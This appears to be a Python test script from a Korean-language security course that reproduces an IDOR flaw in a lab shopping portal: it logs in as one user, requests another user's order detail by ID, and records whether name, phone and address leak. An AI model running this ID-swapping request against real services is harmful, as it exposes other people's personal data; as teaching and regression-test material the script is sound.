"""T01 · 주문 번호만 바꾸면 남의 주문이 보인다(IDOR, A01). 수업 2-1(재연)·2-2(막기).

bob으로 로그인해 alice의 주문 번호(9001)를 조회한다. alice의 이름·전화·주소가 돌아오면 레드.
"""
from __future__ import annotations

from replay import NotReady, Result
from replay._http import ACCOUNTS, new_trace_id, portal, portal_login

T = "T01"
TITLE = "주문 상세 조회에 소유자 확인 없음(IDOR)"
LESSON = "2-2"
SOURCE = "[원본 확인됨] 후보 — 공개 전 원작자 제보 여부 결정(BASELINE 참고)"
STACKS = ("spring",)

VICTIM, ATTACKER = "alice", "bob"


def order_detail_response(user: str, order_id: int, trace_id: str | None = None):
    with portal() as c:
        token = portal_login(c, user)
        headers = {"Authorization": token} | ({"X-Trace-Id": trace_id} if trace_id else {})
        return c.get(f"/order/detail/{order_id}", headers=headers)


def order_detail(user: str, order_id: int, trace_id: str | None = None) -> dict:
    return order_detail_response(user, order_id, trace_id).json()


def run(stack: str = "spring") -> Result:
    if stack not in STACKS:
        raise NotReady(f"{T} {stack} 재연은 아직 없습니다(Express는 수업 diff와 함께 만든다).")
    target = ACCOUNTS[VICTIM]["orders"][0]
    r = order_detail_response(ATTACKER, target, new_trace_id("t01"))
    body = r.json()
    data = body.get("data") or {}
    leaked = body.get("code") == 200 and data.get("memberId") == ACCOUNTS[VICTIM]["member_id"]
    tid = r.headers.get("X-Trace-Id", "-")
    ev = [f"요청: {ATTACKER} 토큰으로 GET /order/detail/{target}  ({VICTIM}의 주문)",
          f"응답: code={body.get('code')} message={body.get('message')!r}",
          f"추적 번호: X-Trace-Id={tid}  (로그 찾기: make logs S=mall-portal | grep {tid})"]
    if leaked:
        ev.append(f"보인 정보: 주문자={data.get('memberUsername')} 받는 사람={data.get('receiverName')} "
                  f"전화={data.get('receiverPhone')} 주소={data.get('receiverDetailAddress')}")
        return Result(True, f"{ATTACKER} 계정이 {VICTIM}의 주문 {target}을 열었다", ev)
    return Result(False, f"{ATTACKER} 계정은 {VICTIM}의 주문 {target}을 열 수 없다", ev)
